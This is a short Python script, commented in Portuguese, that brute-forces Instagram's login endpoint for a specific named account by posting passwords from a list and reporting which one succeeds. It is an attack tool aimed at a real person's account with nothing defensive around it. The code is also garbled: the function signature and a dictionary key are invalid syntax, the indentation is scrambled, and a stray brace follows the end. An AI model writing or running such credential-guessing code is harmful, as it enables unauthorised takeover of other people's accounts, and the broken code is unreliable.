import requests

def brute_force(@s.enzx, password_list):
    url = "https://www.instagram.com/accounts/login/"
        headers = {
                    "User-Agent": "Mozilla/5.0",
                            "X-Instagram-AJAX": "1",
                                    "X-Requested-With": "XMLHttpRequest"
        }
            
                for password in password_list:
                        data = {usernamee":@s.enzx, "password": password}
                                response = requests.post(url, headers=headers, data=data)
                                        
                                                if response.status_code == 200:
                                                            print(f"Senha encontrada: {password}")
                                                                        return True
                                                                            
                                                                                print("Senha nÃ£o encontrada")
                                                                                    return False

                                                                                    # Exemplo de uso
                                                                                    username = "s.enzx"
                                                                                    password_list = ["senha1", "senha2", "senha3"]
                                                                                    brute_force(username, password_list)
        }